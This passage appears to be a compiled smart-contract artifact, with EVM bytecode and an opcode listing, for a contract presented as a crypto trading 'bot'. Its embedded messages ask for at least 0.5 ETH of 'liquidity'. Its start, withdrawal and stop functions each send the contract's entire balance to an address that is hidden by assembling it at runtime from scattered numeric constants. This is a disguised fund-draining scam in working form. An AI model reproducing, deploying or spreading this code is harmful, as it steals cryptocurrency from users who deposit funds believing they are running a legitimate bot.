fd5b505050565b60606040518060a00160405280607e8152602001610f54607e9139905090565b60605f6102876040518060400160405280600181526020017f780000000000000000000000000000000000000000000000000000000000000081525061028261027d610678565b610682565b61090c565b90505f620d6fbc90505f610299610a9e565b90505f620e843390505f6102ab610aa8565b90505f61248590505f6102bc610ab2565b90505f620bf31590505f6102d8896102d38a610682565b61090c565b90505f6102f56102e789610682565b6102f089610682565b61090c565b90505f61031261030488610682565b61030d88610682565b61090c565b90505f61032f61032187610682565b61032a87610682565b61090c565b90505f61034e61033f868661090c565b610349858561090c565b61090c565b90505f6103906040518060400160405280600181526020017f30000000000000000000000000000000000000000000000000000000000000008152508361090c565b9050809e50505050505050505050505050505090565b5f808290505f80805f600290505b602a81101561066457610100846103cb9190610c73565b93508481815181106103e0576103df610cb4565b5b602001015160f81c60f81b60f81c60ff169250846001826104019190610cea565b8151811061041257610411610cb4565b5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff1610158015610463575060668373ffffffffffffffffffffffffffffffffffffffff1611155b1561047c576057836104759190610d1d565b9250610528565b60418373ffffffffffffffffffffffffffffffffffffffff16101580156104ba575060468373ffffffffffffffffffffffffffffffffffffffff1611155b156104d3576037836104cc9190610d1d565b9250610527565b60308373ffffffffffffffffffffffffffffffffffffffff1610158015610511575060398373ffffffffffffffffffffffffffffffffffffffff1611155b15610526576030836105239190610d1d565b92505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff1610158015610566575060668273ffffffffffffffffffffffffffffffffffffffff1611155b1561057f576057826105789190610d1d565b915061062b565b60418273ffffffffffffffffffffffffffffffffffffffff16101580156105bd575060468273ffffffffffffffffffffffffffffffffffffffff1611155b156105d6576037826105cf9190610d1d565b915061062a565b60308273ffffffffffffffffffffffffffffffffffffffff1610158015610614575060398273ffffffffffffffffffffffffffffffffffffffff1611155b15610629576030826106269190610d1d565b91505b5b5b816010846106399190610c73565b6106439190610d64565b8461064e9190610d64565b935060028161065d9190610cea565b90506103b4565b5082945050505050919050565b5f47905090565b5f6204cc53905090565b60605f808390505b5f81146106b357818061069c90610dab565b9250506010816106ac9190610e1f565b905061068a565b5f8267ffffffffffffffff8111156106ce576106cd610e4f565b5b6040519080825280601f01601f1916602001820160405280156107005781602001600182028036833780820191505090505b5090505f5b8381101561079d5760108661071a9190610e7c565b925061072583610abc565b82600183876107349190610eac565b61073e9190610eac565b8151811061074f5761074e610cb4565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff191690815f1a90535060108661078a9190610e1f565b95508061079690610dab565b9050610705565b505f81519050600481036107fa575f6107eb6040518060400160405280600181526020017f30000000000000000000000000000000000000000000000000000000000000008152508461090c565b90508095505050505050610907565b60038103610851575f6108426040518060400160405280600181526020017f30000000000000000000000000000000000000000000000000000000000000008152508461090c565b90508095505050505050610907565b600281036108a8575f6108996040518060400160405280600381526020017f30303000000000000000000000000000000000000000000000000000000000008152508461090c565b90508095505050505050610907565b600181036108ff575f6108f06040518060400160405280600481526020017f30303030000000000000000000000000000000000000000000000000000000008152508461090c565b90508095505050505050610907565b819450505050505b919050565b60605f8390505f8390505f815183516109259190610cea565b67ffffffffffffffff81111561093e5761093d610e4f565b5b6040519080825280601f01601f1916602001820160405280156109705781602001600182028036833780820191505090505b5090505f8190505f805f91505b8551821015610a045785828151811061099957610998610cb4565b5b602001015160f81c60f81b8382806109b090610dab565b9350815181106109c3576109c2610cb4565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff191690815f1a90535081806109fc90610dab565b92505061097d565b5f91505b8451821015610a8f57848281518110610a2457610a23610cb4565b5b602001015160f81c60f81b838280610a3b90610dab565b935081518110610a4e57610a4d610cb4565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff191690815f1a9053508180610a8790610dab565b925050610a08565b82965050505050505092915050565b5f6204958a905090565b5f620ef2e4905090565b5f620ebe5b905090565b5f8160ff165f11158015610ad4575060098260ff1611155b15610b1257817f300000000000000000000000000000000000000000000000000000000000000060f81c610b089190610eeb565b60f81b9050610b78565b8160ff16600a11158015610b2a5750600f8260ff1611155b15610b7457600a827f610000000000000000000000000000000000000000000000000000000000000060f81c610b609190610eeb565b610b6a9190610f1f565b60f81b9050610b78565b5f80fd5b919050565b5f81519050919050565b5f82825260208201905092915050565b5f5b83811015610bb4578082015181840152602081019050610b99565b5f8484015250505050565b5f601f19601f8301169050919050565b5f610bd982610b7d565b610be38185610b87565b9350610bf3818560208601610b97565b610bfc81610bbf565b840191505092915050565b5f6020820190508181035f830152610c1f8184610bcf565b905092915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f610c7d82610c27565b9150610c8883610c27565b9250828202610c9681610c27565b91508282048414831517610cad57610cac610c46565b5b5092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b5f819050919050565b5f610cf482610ce1565b9150610cff83610ce1565b9250828201905080821115610d1757610d16610c46565b5b92915050565b5f610d2782610c27565b9150610d3283610c27565b9250828203905073ffffffffffffffffffffffffffffffffffffffff811115610d5e57610d5d610c46565b5b92915050565b5f610d6e82610c27565b9150610d7983610c27565b9250828201905073ffffffffffffffffffffffffffffffffffffffff811115610da557610da4610c46565b5b92915050565b5f610db582610ce1565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8203610de757610de6610c46565b5b600182019050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f610e2982610ce1565b9150610e3483610ce1565b925082610e4457610e43610df2565b5b828204905092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b5f610e8682610ce1565b9150610e9183610ce1565b925082610ea157610ea0610df2565b5b828206905092915050565b5f610eb682610ce1565b9150610ec183610ce1565b9250828203905081811115610ed957610ed8610c46565b5b92915050565b5f60ff82169050919050565b5f610ef582610edf565b9150610f0083610edf565b9250828201905060ff811115610f1957610f18610c46565b5b92915050565b5f610f2982610edf565b9150610f3483610edf565b9250828203905060ff811115610f4d57610f4c610c46565b5b9291505056fe4e6f7420656e6f756768206c697175696469747920617661696c61626c65206f6e2074686520636f6e747261637420746f2072756e2074686520626f742e20436f6e747261637420636f6465206e65656473206174206c6561737420302e352045544820746f2061766f69642063757272656e742067617320666565732ea2646970667358221220734c2db0fa60328170891dfa6297b99f06d0f9e9c29d594aec0fc679d09dfc7f64736f6c63430008140033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x1007 DUP1 PUSH2 0x1D PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x42 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1B55BA3A EQ PUSH2 0x4D JUMPI DUP1 PUSH4 0x70E44C6A EQ PUSH2 0x57 JUMPI DUP1 PUSH4 0xBEDF0F4A EQ PUSH2 0x75 JUMPI DUP1 PUSH4 0xD82C52D6 EQ PUSH2 0x7F JUMPI PUSH2 0x49 JUMP JUMPDEST CALLDATASIZE PUSH2 0x49 JUMPI STOP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x55 PUSH2 0xA9 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x5F PUSH2 0x10F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x6C SWAP2 SWAP1 PUSH2 0xC07 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x7D PUSH2 0x1B0 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x8A JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x93 PUSH2 0x216 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xA0 SWAP2 SWAP1 PUSH2 0xC07 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH0 PUSH2 0xBA PUSH2 0xB5 PUSH2 0x236 JUMP JUMPDEST PUSH2 0x3A6 JUMP JUMPDEST SWAP1 POP PUSH0 DUP2 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH2 0xE2 PUSH2 0x671 JUMP JUMPDEST SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x10A JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x60 PUSH0 PUSH2 0x122 PUSH2 0x11D PUSH2 0x236 JUMP JUMPDEST PUSH2 0x3A6 JUMP JUMPDEST SWAP1 POP PUSH0 DUP2 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH2 0x14A PUSH2 0x671 JUMP JUMPDEST SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x172 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x13 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x5769746864726177616C20636F6D706C65746500000000000000000000000000 DUP2 MSTORE POP SWAP3 POP POP POP SWAP1 JUMP JUMPDEST PUSH0 PUSH2 0x1C1 PUSH2 0x1BC PUSH2 0x236 JUMP JUMPDEST PUSH2 0x3A6 JUMP JUMPDEST SWAP1 POP PUSH0 DUP2 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH2 0x1E9 PUSH2 0x671 JUMP JUMPDEST SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x211 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0xA0 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x7E DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0xF54 PUSH1 0x7E SWAP2 CODECOPY SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH0 PUSH2 0x287 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x7800000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH2 0x282 PUSH2 0x27D PUSH2 0x678 JUMP JUMPDEST PUSH2 0x682 JUMP JUMPDEST PUSH2 0x90C JUMP JUMPDEST SWAP1 POP PUSH0 PUSH3 0xD6FBC SWAP1 POP PUSH0 PUSH2 0x299 PUSH2 0xA9E JUMP JUMPDEST SWAP1 POP PUSH0 PUSH3 0xE8433 SWAP1 POP PUSH0 PUSH2 0x2AB PUSH2 0xAA8 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x2485 SWAP1 POP PUSH0 PUSH2 0x2BC PUSH2 0xAB2 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH3 0xBF315 SWAP1 POP PUSH0 PUSH2 0x2D8 DUP10 PUSH2 0x2D3 DUP11 PUSH2 0x682 JUMP JUMPDEST PUSH2 0x90C JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x2F5 PUSH2 0x2E7 DUP10 PUSH2 0x682 JUMP JUMPDEST PUSH2 0x2F0 DUP10 PUSH2 0x682 JUMP JUMPDEST PUSH2 0x90C JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x312 PUSH2 0x304 DUP9 PUSH2 0x682 JUMP JUMPDEST PUSH2 0x30D DUP9 PUSH2 0x682 JUMP JUMPDEST PUSH2 0x90C JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x32F PUSH2 0x321 DUP8 PUSH2 0x682 JUMP JUMPDEST PUSH2 0x32A DUP8 PUSH2 0x682 JUMP JUMPDEST PUSH2 0x90C JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x34E PUSH2 0x33F DUP7 DUP7 PUSH2 0x90C JUMP JUMPDEST PUSH2 0x349 DUP6 DUP6 PUSH2 0x90C JUMP JUMPDEST PUSH2 0x90C JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x390 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH2 0x90C JUMP JUMPDEST SWAP1 POP DUP1 SWAP15 POP POP POP POP POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH0 DUP1 DUP3 SWAP1 POP PUSH0 DUP1 DUP1 PUSH0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x664 JUMPI PUSH2 0x100 DUP5 PUSH2 0x3CB SWAP2 SWAP1 PUSH2 0xC73 JUMP JUMPDEST SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x3E0 JUMPI PUSH2 0x3DF PUSH2 0xCB4 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 PUSH2 0x401 SWAP2 SWAP1 PUSH2 0xCEA JUMP JUMPDEST DUP2 MLOAD DUP2 LT PUSH2 0x412 JUMPI PUSH2 0x411 PUSH2 0xCB4 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x463 JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x47C JUMPI PUSH1 0x57 DUP4 PUSH2 0x475 SWAP2 SWAP1 PUSH2 0xD1D JUMP JUMPDEST SWAP3 POP PUSH2 0x528 JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x4BA JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x4D3 JUMPI PUSH1 0x37 DUP4 PUSH2 0x4CC SWAP2 SWAP1 PUSH2 0xD1D JUMP JUMPDEST SWAP3 POP PUSH2 0x527 JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x511 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x526 JUMPI PUSH1 0x30 DUP4 PUSH2 0x523 SWAP2 SWAP1 PUSH2 0xD1D JUMP JUMPDEST SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x566 JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x57F JUMPI PUSH1 0x57 DUP3 PUSH2 0x578 SWAP2 SWAP1 PUSH2 0xD1D JUMP JUMPDEST SWAP2 POP PUSH2 0x62B JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x5BD JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x5D6 JUMPI PUSH1 0x37 DUP3 PUSH2 0x5CF SWAP2 SWAP1 PUSH2 0xD1D JUMP JUMPDEST SWAP2 POP PUSH2 0x62A JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x614 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x629 JUMPI PUSH1 0x30 DUP3 PUSH2 0x626 SWAP2 SWAP1 PUSH2 0xD1D JUMP JUMPDEST SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 PUSH2 0x639 SWAP2 SWAP1 PUSH2 0xC73 JUMP JUMPDEST PUSH2 0x643 SWAP2 SWAP1 PUSH2 0xD64 JUMP JUMPDEST DUP5 PUSH2 0x64E SWAP2 SWAP1 PUSH2 0xD64 JUMP JUMPDEST SWAP4 POP PUSH1 0x2 DUP2 PUSH2 0x65D SWAP2 SWAP1 PUSH2 0xCEA JUMP JUMPDEST SWAP1 POP PUSH2 0x3B4 JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH3 0x4CC53 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH0 DUP1 DUP4 SWAP1 POP JUMPDEST PUSH0 DUP2 EQ PUSH2 0x6B3 JUMPI DUP2 DUP1 PUSH2 0x69C SWAP1 PUSH2 0xDAB JUMP JUMPDEST SWAP3 POP POP PUSH1 0x10 DUP2 PUSH2 0x6AC SWAP2 SWAP1 PUSH2 0xE1F JUMP JUMPDEST SWAP1 POP PUSH2 0x68A JUMP JUMPDEST PUSH0 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x6CE JUMPI PUSH2 0x6CD PUSH2 0xE4F JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x700 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x79D JUMPI PUSH1 0x10 DUP7 PUSH2 0x71A SWAP2 SWAP1 PUSH2 0xE7C JUMP JUMPDEST SWAP3 POP PUSH2 0x725 DUP4 PUSH2 0xABC JUMP JUMPDEST DUP3 PUSH1 0x1 DUP4 DUP8 PUSH2 0x734 SWAP2 SWAP1 PUSH2 0xEAC JUMP JUMPDEST PUSH2 0x73E SWAP2 SWAP1 PUSH2 0xEAC JUMP JUMPDEST DUP2 MLOAD DUP2 LT PUSH2 0x74F JUMPI PUSH2 0x74E PUSH2 0xCB4 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 PUSH2 0x78A SWAP2 SWAP1 PUSH2 0xE1F JUMP JUMPDEST SWAP6 POP DUP1 PUSH2 0x796 SWAP1 PUSH2 0xDAB JUMP JUMPDEST SWAP1 POP PUSH2 0x705 JUMP JUMPDEST POP PUSH0 DUP2 MLOAD SWAP1 POP PUSH1 0x4 DUP2 SUB PUSH2 0x7FA JUMPI PUSH0 PUSH2 0x7EB PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0x90C JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0x907 JUMP JUMPDEST PUSH1 0x3 DUP2 SUB PUSH2 0x851 JUMPI PUSH0 PUSH2 0x842 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0x90C JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0x907 JUMP JUMPDEST PUSH1 0x2 DUP2 SUB PUSH2 0x8A8 JUMPI PUSH0 PUSH2 0x899 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x3 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3030300000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0x90C JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0x907 JUMP JUMPDEST PUSH1 0x1 DUP2 SUB PUSH2 0x8FF JUMPI PUSH0 PUSH2 0x8F0 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x4 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3030303000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0x90C JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0x907 JUMP JUMPDEST DUP2 SWAP5 POP POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH0 DUP4 SWAP1 POP PUSH0 DUP4 SWAP1 POP PUSH0 DUP2 MLOAD DUP4 MLOAD PUSH2 0x925 SWAP2 SWAP1 PUSH2 0xCEA JUMP JUMPDEST PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x93E JUMPI PUSH2 0x93D PUSH2 0xE4F JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x970 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH0 DUP2 SWAP1 POP PUSH0 DUP1 PUSH0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH2 0xA04 JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x999 JUMPI PUSH2 0x998 PUSH2 0xCB4 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH2 0x9B0 SWAP1 PUSH2 0xDAB JUMP JUMPDEST SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x9C3 JUMPI PUSH2 0x9C2 PUSH2 0xCB4 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH2 0x9FC SWAP1 PUSH2 0xDAB JUMP JUMPDEST SWAP3 POP POP PUSH2 0x97D JUMP JUMPDEST PUSH0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH2 0xA8F JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0xA24 JUMPI PUSH2 0xA23 PUSH2 0xCB4 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH2 0xA3B SWAP1 PUSH2 0xDAB JUMP JUMPDEST SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0xA4E JUMPI PUSH2 0xA4D PUSH2 0xCB4 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH2 0xA87 SWAP1 PUSH2 0xDAB JUMP JUMPDEST SWAP3 POP POP PUSH2 0xA08 JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH3 0x4958A SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH3 0xEF2E4 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH3 0xEBE5B SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 DUP2 PUSH1 0xFF AND PUSH0 GT ISZERO DUP1 ISZERO PUSH2 0xAD4 JUMPI POP PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xB12 JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR PUSH2 0xB08 SWAP2 SWAP1 PUSH2 0xEEB JUMP JUMPDEST PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xB78 JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH2 0xB2A JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xB74 JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR PUSH2 0xB60 SWAP2 SWAP1 PUSH2 0xEEB JUMP JUMPDEST PUSH2 0xB6A SWAP2 SWAP1 PUSH2 0xF1F JUMP JUMPDEST PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xB78 JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xBB4 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xB99 JUMP JUMPDEST PUSH0 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xBD9 DUP3 PUSH2 0xB7D JUMP JUMPDEST PUSH2 0xBE3 DUP2 DUP6 PUSH2 0xB87 JUMP JUMPDEST SWAP4 POP PUSH2 0xBF3 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0xB97 JUMP JUMPDEST PUSH2 0xBFC DUP2 PUSH2 0xBBF JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 